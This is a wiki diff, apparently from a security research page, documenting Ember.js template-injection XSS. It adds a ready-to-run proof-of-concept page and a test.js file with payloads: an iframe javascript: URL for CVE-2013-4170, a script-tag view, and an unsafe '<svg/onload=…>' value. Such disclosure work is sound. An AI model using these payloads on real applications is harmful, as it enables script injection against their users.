@@ -23,29 +23,66 @@ From http://emberjs.com/
 
 Ember.js uses an advanced parser to validate the expressions a developer can use inside the usual curlies. Unlike frameworks such as AngularJS, Ember.js is not vulnerable against "sandbox"-escapes such as the `constructor`-trick.
 
-Earlier versions were nevertheless vulnerable against a concatenation-based bug in the `tagName` attribute of the view element. The bug has been fixed in version 1.0.0-rc.6.1. The following "paste-and-go"-ready code example illustrates this issue. Furthermore, the `tagName` attribute can still be used for arbitrary script execution by simply creating a `<script>` element and filling the view with the !JavaScript code to execute.
-
+Earlier versions were nevertheless vulnerable against a concatenation-based bug in the `tagName` attribute of the view element. The bug has been fixed in version 1.0.0-rc.6.1. 
 
 == Attacks against View.tagName ==
+
+The following "paste-and-go"-ready code example illustrates this issue. Furthermore, the `tagName` attribute can still be used for arbitrary script execution by simply creating a `<script>` element and filling the view with the !JavaScript code to execute. ember.js also supports usage of triple-curlies to unsafely inject content. This is a feature most "mustache"-driven templating systems ship.
  
 {{{
 <!doctype html>
 <html>
 <head>
-  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/jquery.min.js"></script>
-  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/handlebars.js"></script>
-  <script src="http://builds.emberjs.com/ember-1.0.0-rc.6.js"></script>
+  <script src="http://code.jquery.com/jquery-1.10.2.js"></script>
+  <script src="http://builds.emberjs.com/handlebars-1.0.0-rc.4.js"></script>
+  <script src="http://builds.emberjs.com/ember-1.0.0-rc.6.1.js"></script>
   <script src="http://emberjs.com.s3.amazonaws.com/getting-started/ember-data.js"></script>
   <script src="http://emberjs.com.s3.amazonaws.com/getting-started/local_storage_adapter.js"></script>
   <script src="test.js"></script>
 </head>
 <body>
+  <script>alert = function(a){
+  	return confirm(a)
+  }
+  </script>
   <script type="text/x-handlebars" data-template-name="x">
-  {{view tagName=[iframe src=javascript:123]}} <- fixed in 1.0.0-rc.6.1 (CVE-2013-4170)
-  {{#view tagName=script}}alert(top){{/view}}
-  {{#each controller}}{{{unsafe}}}{{/each}}
+      {{view tagName=[iframe src=javascript:alert(1)]}} <- fixed in 1.0.0-rc.6.1 (CVE-2013-4170)
+      {{#view tagName=script}}alert(2){{/view}}
+      {{#each controller}}{{{unsafe}}}{{/each}}
   </script>
 </body>
+}}}
+
+test.js
+{{{
+window.X = Ember.Application.create();
+
+X.Router.map(function () {
+  this.resource('x', { path: '/' });
+});
+
+X.XRoute = Ember.Route.extend({
+  model: function () {
+    return X.X.find();
+  }
+});
+
+X.Store = DS.Store.extend({
+  revision: 12,
+  adapter: 'DS.FixtureAdapter'
+});
+
+X.X = DS.Model.extend(  {
+    id: 1,
+    unsafe: '<svg/onload=alert(3)>'
+});
+
+X.X.FIXTURES = [{id:1}];
+
+for (var name in Handlebars.templates) {
+  var template = Handlebars.templates[name];
+  Ember.TEMPLATES[name] = template;
+}
 }}}
 
 == Script Execution via View.tagName ==
